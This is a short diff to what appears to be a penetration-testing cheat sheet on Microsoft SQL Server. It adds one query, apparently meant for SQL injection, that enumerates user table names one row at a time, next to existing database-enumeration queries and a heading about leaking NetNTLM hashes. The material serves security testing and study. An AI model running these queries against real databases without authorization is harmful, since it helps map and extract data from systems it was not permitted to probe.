@@ -73,6 +73,10 @@ SELECT DB_NAME(N); — for N = 0,1,2,3;
 SELECT * FROM SYSOBJECTS WHERE xtype = 'U';
 ```
 
+```sql
+SELECT name FROM $DB_NAME..sysobjects WHERE xtype = 'U' order by name offset 1 rows fetch next 1 rows only)
+```
+
 Leak NetNTLM hashes
 ---
 #hash #ntlm #netntlm #responder
